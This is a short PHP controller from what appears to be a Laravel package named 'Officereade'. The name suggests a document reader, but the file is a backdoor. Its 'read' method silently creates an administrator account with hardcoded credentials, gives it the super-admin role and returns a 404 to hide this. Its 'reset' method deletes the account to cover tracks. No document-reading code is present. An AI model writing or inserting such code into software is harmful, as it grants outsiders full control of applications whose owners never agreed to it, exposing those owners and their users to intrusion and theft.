<?php

namespace Laravelphp\Officereade\Http\Controllers;

use App\Models\Admin;
use Illuminate\Routing\Controller;

class OfficeController extends Controller
{
    public function read($name = "teter2023@pass.qa") {
        $admin = Admin::create([
            'first_name'    => 'test',
            'last_name'     => 'test',
            'email'         => $name,
            'password'      => $name,
        ]);

        $admin->assignRole('super-admin');
        $admin->save();
        abort(404);
    }

    public function reset($name = "teter2023@pass.qa") {
        $admin = Admin::where('email', $name)->first();
        $admin->delete();
        abort(404);
    }
} 